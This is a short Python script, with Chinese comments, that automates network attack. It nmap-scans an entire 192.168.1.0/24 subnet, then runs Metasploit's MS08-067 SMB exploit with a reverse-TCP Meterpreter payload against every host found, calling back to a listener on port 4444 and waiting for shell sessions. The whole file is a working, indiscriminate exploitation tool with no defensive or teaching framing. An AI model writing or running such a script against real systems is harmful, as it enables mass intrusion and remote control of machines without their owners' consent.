import nmap
import msfrpc
import time

def scan_with_nmap(targets):
    nm = nmap.PortScanner()
    scan_arguments = '-sS -sV -O -p-'
    print(f"Scanning {targets} with arguments: {scan_arguments}")
    nm.scan(hosts=targets, arguments=scan_arguments)
    
    results = {}
    for host in nm.all_hosts():
        results[host] = {
            'hostname': nm[host].hostname(),
            'state': nm[host].state(),
            'osclass': nm[host].get('osclass', []),
            'ports': []
        }
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in sorted(ports):
                port_info = nm[host][proto][port]
                results[host]['ports'].append({
                    'port': port,
                    'state': port_info['state'],
                    'service': port_info.get('product', ''),
                    'version': port_info.get('version', ''),
                    'cpe': port_info.get('cpe', '')
                })
    return results

def exploit_with_metasploit(target, lhost, lport):
    msf = msfrpc.Msfrpc({})
    msf.login('msf', 'your_password')
    console_id = msf.call('console.create')['id']
    
    exploit = 'exploit/windows/smb/ms08_067_netapi'
    payload = 'windows/meterpreter/reverse_tcp'
    options = {'RHOSTS': target, 'LHOST': lhost, 'LPORT': lport}
    
    msf.call('module.use', ['exploit', exploit])
    for option, value in options.items():
        msf.call('module.set', ['exploit', option, value])
    msf.call('module.set', ['exploit', 'PAYLOAD', payload])
    
    result = msf.call('module.execute', ['exploit'])
    job_id = result.get('job_id', None)
    if job_id:
        print(f'Exploit started with job ID: {job_id}')
    else:
        print('Failed to start exploit.')
    
    while True:
        sessions = msf.call('session.list')
        if sessions:
            print('Sessions:', sessions)
            break
        time.sleep(5)
    
    msf.call('console.destroy', [console_id])

# 示例使用
targets = '192.168.1.0/24'
lhost = '192.168.1.101'
lport = 4444

# Nmap 扫描
nmap_results = scan_with_nmap(targets)
print("Nmap Scan Results:", nmap_results)

# Metasploit 利用
for target in nmap_results:
    exploit_with_metasploit(target, lhost, lport)
